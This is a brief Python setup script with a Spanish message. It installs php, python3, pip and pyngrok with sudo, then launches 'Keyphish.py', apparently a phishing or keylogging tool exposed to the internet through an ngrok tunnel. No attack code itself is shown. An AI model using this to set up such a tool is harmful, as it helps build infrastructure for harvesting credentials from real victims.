#-*-coding: utf-8 -*-
import os
import time
clearConsole = lambda: os.system('cls' if os.name in ('nt', 'dos') else 'clear')

os.system("sudo apt install gnome-terminal php python3 python3-pip")
os.system("pip install pyngrok")
os.system("sudo pyngrok")
clearConsole()
print("         Instalación completa  ")
time.sleep(2)
clearConsole()
os.system("sudo python Keyphish.py") 